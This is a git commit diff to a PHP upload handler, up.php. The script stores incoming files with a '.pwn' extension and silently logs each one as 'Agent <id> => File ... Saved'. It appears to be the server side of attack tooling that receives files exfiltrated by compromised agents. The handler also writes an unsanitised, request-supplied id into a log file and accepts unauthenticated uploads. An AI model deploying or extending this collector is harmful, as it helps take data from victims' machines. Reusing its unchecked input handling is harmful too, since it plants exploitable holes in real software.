0519be8643e0a205a4f4376bc95b82ab9093eaf1
Ug0Security <c.vallicari@gmail.com>
2022-10-13 01:53:58 +0200

    Update up.php

--- web/up.php
+++ web/up.php
@@ -1,4 +1,7 @@
 <?php
+$id=$_REQUEST[ 'id' ];
+$sid = strval($id);
+
 $target_dir = "uploads/";
 $target_file = $target_dir . basename($_FILES["data"]["name"]).".pwn";
 $uploadOk = 1;
@@ -12,16 +15,15 @@ if ($_FILES["data"]["size"] > 500000) {
 }
 
 
-
-// Check if $uploadOk is set to 0 by an error
 if ($uploadOk == 0) {
-  echo "Sorry, your file was not uploaded.";
-// if everything is ok, try to upload file
 } else {
   if (move_uploaded_file($_FILES["data"]["tmp_name"] , $target_file)) {
-    echo "The file ". htmlspecialchars( basename( $_FILES["fileToUpload"]["name"])). " has been uploaded.";
+  $file = 'res.txt';
+  $current = file_get_contents($file);
+  $current .= "Agent ".$id."=> File ".basename($_FILES["data"]["name"])." Saved to $target_file";
+  file_put_contents($file, $current);  
   } else {
-    echo "Sorry, there was an error uploading your file.";
   }
 }
+
 ?>
